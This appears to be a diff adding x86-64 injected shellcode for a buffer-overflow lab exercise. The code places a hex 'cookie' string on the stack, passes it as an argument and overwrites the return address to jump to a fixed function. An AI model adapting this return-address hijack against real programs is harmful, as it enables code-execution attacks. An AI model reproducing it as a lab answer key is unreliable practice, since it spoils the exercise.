@@ -1,0 +1,7 @@
+leaq 0x256(%rsp),%rax
+movl $0x39623935,(%rax)
+movl $0x61663739,0x4(%rax)
+movl $0x0,0x8(%rax)
+movq %rax,%rdi
+movq $0x4018fa,(%rsp)
+ret
